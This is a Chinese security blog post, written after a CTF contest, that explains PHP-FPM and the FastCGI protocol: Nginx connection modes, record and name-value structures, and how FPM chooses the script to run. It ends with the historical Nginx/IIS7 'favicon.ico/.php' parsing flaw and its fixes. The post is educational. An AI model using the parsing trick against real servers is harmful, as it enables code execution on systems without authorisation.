<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PHP-FPM攻击详解 | yake-daigua</title><meta name="keywords" content="SSRF,PHP-FPM"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="声明文章投稿于跳跳糖社区：https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1775&#x2F; 起因参加了浙江省信息安全竞赛，检验了一下自学3个月网安的成果。其中初赛中web题有一道SSRF攻击FastCGI的题目（PHP-FPM），是一点思路都没有，我当时对SSRF的认识还停留在利用Gopherus工具攻击就行了的阶段。经过三天时间的梳理，终于对PHP-FPM了解了一点，于是复制粘贴般的写下这篇文章">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP-FPM攻击详解">
<meta property="og:url" content="https://yake-daigua.top/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="声明文章投稿于跳跳糖社区：https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1775&#x2F; 起因参加了浙江省信息安全竞赛，检验了一下自学3个月网安的成果。其中初赛中web题有一道SSRF攻击FastCGI的题目（PHP-FPM），是一点思路都没有，我当时对SSRF的认识还停留在利用Gopherus工具攻击就行了的阶段。经过三天时间的梳理，终于对PHP-FPM了解了一点，于是复制粘贴般的写下这篇文章">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/%E6%9C%AA%E9%97%BB%E8%8A%B1%E5%90%8D_48518498.jpg">
<meta property="article:published_time" content="2022-09-25T09:53:24.000Z">
<meta property="article:modified_time" content="2022-11-02T11:42:05.946Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="PHP-FPM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/%E6%9C%AA%E9%97%BB%E8%8A%B1%E5%90%8D_48518498.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP-FPM攻击详解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-02 19:42:05'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/%E6%9C%AA%E9%97%BB%E8%8A%B1%E5%90%8D_48518498.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP-FPM攻击详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-25T09:53:24.000Z" title="发表于 2022-09-25 17:53:24">2022-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-02T11:42:05.946Z" title="更新于 2022-11-02 19:42:05">2022-11-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/SSRF/">SSRF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP-FPM攻击详解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>文章投稿于跳跳糖社区：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1775/">https://tttang.com/archive/1775/</a></p>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>参加了浙江省信息安全竞赛，检验了一下自学3个月网安的成果。其中初赛中web题有一道SSRF攻击FastCGI的题目（PHP-FPM），是一点思路都没有，我当时对SSRF的认识还停留在利用Gopherus工具攻击就行了的阶段。经过三天时间的梳理，终于对PHP-FPM了解了一点，于是复制粘贴般的写下这篇文章。</p>
<h1 id="认识Nginx和PHP-FPM"><a href="#认识Nginx和PHP-FPM" class="headerlink" title="认识Nginx和PHP-FPM"></a>认识Nginx和PHP-FPM</h1><h4 id="Nginx："><a href="#Nginx：" class="headerlink" title="Nginx："></a>Nginx：</h4><p>Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。</p>
<h4 id="PHP-FPM："><a href="#PHP-FPM：" class="headerlink" title="PHP-FPM："></a>PHP-FPM：</h4><p>在早期web-server时没有cgi的概念，因为大都是html静态文件，但是后来出现了php等动态语言，我们需要交给php解释器来处理。让php解释器和webserver进行通信时，就产生了cgi协议。但是由于其每次都要开关进程，非常浪费资源，于是出现了fastcgi，利用一个进程一次处理多个请求。而php-fpm（php-Fastcgi Process Manager）就是fastcgi的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种进程。master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p>
<p>Ps:默认是unix socket连接。</p>
<h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p>Nginx通过反向代理功能将动态请求转向后端PHP-FPM。</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" alt="image-20220923120208667"></p>
<p>Nginx和fastcgi的通信方式有两种，一种是TCP的方式，一种是unix socke方式。</p>
<h4 id="TCP通信方式"><a href="#TCP通信方式" class="headerlink" title="TCP通信方式"></a>TCP通信方式</h4><p>TCP模式即是php-fpm进程会监听本机上的一个端口(默认9000)，然后nginx会把客户端数据通过fastcgi协议传给9000端口，php-fpm拿到数据后会调用cgi进程解析。</p>
<p>它允许通过网络进程之间的通信，也可以通过loopback进行本地进程之间通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">location ~ [^/]\.php(/|$)</span><br><span class="line">&#123;</span><br><span class="line">        try_files $uri =404;</span><br><span class="line">        fastcgi_pass 127.0.0.1:9000;    // 修改这里，指定fastcgi在127.0.0.1的9000端口</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        include pathinfo.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Unix-Socket通信方式"><a href="#Unix-Socket通信方式" class="headerlink" title="Unix Socket通信方式"></a>Unix Socket通信方式</h4><p>unix socket其实严格意义上应该叫unix domain<br>socket，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。<br>具体原理这里就不讲了，但是此通信方式的性能会优于TCP</p>
<p>它允许在本地运行的进程之间进行通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">location ~ [^/]\.php(/|$)</span><br><span class="line">&#123;</span><br><span class="line">        try_files $uri =404;</span><br><span class="line">        fastcgi_pass unix:/tmp/php-cgi-74.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        include pathinfo.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>unix socket方式肯定要比tcp的方式快而且消耗资源少，因为socket之间在nginx和php-fpm的进程之间通信，而tcp需要经过本地回环驱动，还要申请临时端口和tcp相关资源。</p>
<p>unix socket会显得不是那么稳定，当并发连接数爆发时，会产生大量的长时缓存，在没有面向连接协议支撑的情况下，大数据包很有可能就直接出错并不会返回异常。而TCP这样的面向连接的协议，多少可以保证通信的正确性和完整性。</p>
<h1 id="Fastcgi协议分析"><a href="#Fastcgi协议分析" class="headerlink" title="Fastcgi协议分析"></a>Fastcgi协议分析</h1><h4 id="Fastcgi-Record"><a href="#Fastcgi-Record" class="headerlink" title="Fastcgi Record"></a>Fastcgi Record</h4><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char type; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p>
<p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p>
<p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p>
<p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p>
<h4 id="Fastcgi-Type"><a href="#Fastcgi-Type" class="headerlink" title="Fastcgi Type"></a>Fastcgi Type</h4><p>刚才介绍了fastcgi一个record中各个结构的含义，其中第二个字节<code>type</code>没详说。</p>
<p><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
<p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
<p>下面给出一个表格，其中列出来最主要的几种type：</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923122516075.png" alt="image-20220923122516075"></p>
<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
<p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>

<p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p>
<ol>
<li>key、value均小于128字节，用 <code>FCGI_NameValuePair11</code></li>
<li>key大于128字节，value小于128字节，用 <code>FCGI_NameValuePair41</code></li>
<li>key小于128字节，value大于128字节，用 <code>FCGI_NameValuePair14</code></li>
<li>key、value均大于128字节，用 <code>FCGI_NameValuePair44</code></li>
</ol>
<p>为什么我只介绍 <code>type</code> 为4的 Record？因为环境变量在后面 PHP-FPM 里有重要作用，之后写代码也会写到这个结构。<code>type</code> 的其他情况，大家可以自己翻文档理解理解。</p>
<h4 id="PHP-FPM解析"><a href="#PHP-FPM解析" class="headerlink" title="PHP-FPM解析"></a>PHP-FPM解析</h4><p>上面我们谈论了关于什么时php-fpm，现在我们详细的讲讲它的解析过程。</p>
<p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p>
<p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
<p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p>
<h1 id="0x04Nginx（IIS7）解析漏洞"><a href="#0x04Nginx（IIS7）解析漏洞" class="headerlink" title="0x04Nginx（IIS7）解析漏洞"></a>0x04Nginx（IIS7）解析漏洞</h1><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>），该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p>
<p>用户请求<code>http://127.0.0.1/favicon.ico/.php</code>，nginx将会发送如下环境变量到fpm里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常来说，<code>SCRIPT_FILENAME</code>的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了<code>fix_pathinfo</code>，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>
<p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>/var/www/html/favicon.ico</code>是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p>
<p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p>
